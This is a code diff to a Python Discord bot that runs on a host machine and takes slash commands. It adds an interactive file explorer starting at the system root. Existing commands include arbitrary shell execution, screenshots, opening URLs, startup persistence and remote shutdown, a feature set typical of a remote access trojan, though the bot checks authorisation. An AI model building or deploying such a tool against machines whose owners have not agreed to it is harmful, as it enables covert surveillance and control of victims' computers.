@@ -11,6 +11,7 @@ import screenshot_taker as ss
 import system_info as sysinfo
 import web_opener
 import startup_manager
+import file_explorer as fe # <-- NEW: Import the file explorer module
 
 # --- Configuration ---
 TOKEN_PATH = 'token.txt'
@@ -23,7 +24,10 @@ session_channel = None
 # --- Bot Setup ---
 intents = discord.Intents.default()
 intents.message_content = True
+# Register the persistent view before the bot runs
 bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
+bot.add_view(fe.FileExplorerView())
+
 
 def load_token() -> str:
     if not os.path.exists(TOKEN_PATH):
@@ -43,13 +47,12 @@ def is_authorized(interaction: discord.Interaction) -> bool:
         return True
     return False
 
-# --- Core Commands (Updated for Public Output) ---
-
+# ... (all previous commands like runcmd, shownotification, etc. remain unchanged) ...
 @bot.tree.command(name="runcmd", description="Execute a system command on this device.")
 async def runcmd(interaction: discord.Interaction, command: str):
     if not is_authorized(interaction):
         return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
-    await interaction.response.defer() # Already public by default
+    await interaction.response.defer()
     output = cmd.execute_command(command)
     if len(output) > 1900:
         output = output[:1900] + "\n[...TRUNCATED...]"
@@ -60,7 +63,6 @@ async def shownotification(interaction: discord.Interaction, title: str, message
     if not is_authorized(interaction):
         return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
     success = notifier.show(title, message)
-    # MODIFIED: Removed ephemeral=True for public confirmation
     if success:
         await interaction.response.send_message(f"✅ Notification sent: **{title}**")
     else:
@@ -70,26 +72,21 @@ async def shownotification(interaction: discord.Interaction, title: str, message
 async def takescreenshot(interaction: discord.Interaction):
     if not is_authorized(interaction):
         return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
-    
-    # MODIFIED: Defer publicly so the followup (screenshot) is also public.
     await interaction.response.defer()
-    
     screenshot_file = ss.take_screenshot()
     if screenshot_file and os.path.exists(screenshot_file):
         try:
-            # The followup will be public because the deferral was public
             await interaction.followup.send(file=discord.File(screenshot_file))
         finally:
             os.remove(screenshot_file)
     else:
-        # MODIFIED: Removed ephemeral=True for public error message.
         await interaction.followup.send("❌ Failed to take screenshot. Check console for errors.")
-        
+
 @bot.tree.command(name="systemspecs", description="Shows hardware specs of this device.")
 async def systemspecs(interaction: discord.Interaction):
     if not is_authorized(interaction):
         return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
-    await interaction.response.defer() # Already public by default
+    await interaction.response.defer()
     specs = sysinfo.get_specs()
     embed = discord.Embed(title=f"💻 System Specifications for {get_device_name()}", color=discord.Color.blue())
     embed.add_field(name="Operating System", value=f"{specs.get('platform', 'N/A')} {specs.get('platform_release', 'N/A')}", inline=False)
@@ -110,7 +107,6 @@ async def openwebsite(interaction: discord.Interaction, url: str):
     if not is_authorized(interaction):
         return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
     success = web_opener.open_url(url)
-    # MODIFIED: Removed ephemeral=True for public confirmation
     if success:
         await interaction.response.send_message(f"✅ Attempted to open `{url}` on the host machine.")
     else:
@@ -120,7 +116,6 @@ async def openwebsite(interaction: discord.Interaction, url: str):
 async def putinstartup(interaction: discord.Interaction):
     if not is_authorized(interaction):
         return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
-    # MODIFIED: Defer publicly so the followup is also public.
     await interaction.response.defer()
     message = startup_manager.add_to_startup()
     await interaction.followup.send(f"`{message}`")
@@ -129,7 +124,6 @@ async def putinstartup(interaction: discord.Interaction):
 async def remotekill(interaction: discord.Interaction):
     if not is_authorized(interaction):
         return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
-    # MODIFIED: Removed ephemeral=True to make the acknowledgement public.
     await interaction.response.send_message("🔴 **Shutdown command received. Terminating session...**")
     offline_embed = discord.Embed(
         title="🔴 Session Terminated",
@@ -139,8 +133,30 @@ async def remotekill(interaction: discord.Interaction):
     if session_channel:
         await session_channel.send(embed=offline_embed)
     await bot.close()
+# --- NEW FILE EXPLORER COMMAND ---
 
-# --- Connection and Session Handling (No Changes Needed) ---
+@bot.tree.command(name="explorer", description="Launch an interactive file explorer for this device.")
+async def explorer(interaction: discord.Interaction):
+    if not is_authorized(interaction):
+        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
+    
+    await interaction.response.defer()
+    
+    channel_id = interaction.channel.id
+    # Set the initial path to the system root
+    initial_path = os.path.abspath(os.sep)
+    fe.explorer_sessions[channel_id] = initial_path
+    
+    embed, dirs = fe.create_explorer_embed(initial_path)
+    view = fe.FileExplorerView()
+    
+    # Create the dynamic callback for the "Change Directory" button
+    view.children[3].callback = view.create_modal_callback(dirs)
+    
+    await interaction.followup.send(embed=embed, view=view)
+
+
+# --- Connection and Session Handling ---
 
 @bot.event
 async def on_ready():
@@ -180,6 +196,7 @@ async def on_ready():
     await session_channel.send(embed=online_embed)
 
 async def main():
+    """Main function to run the bot and handle its lifecycle."""
     async with bot:
         try:
             await bot.start(load_token())
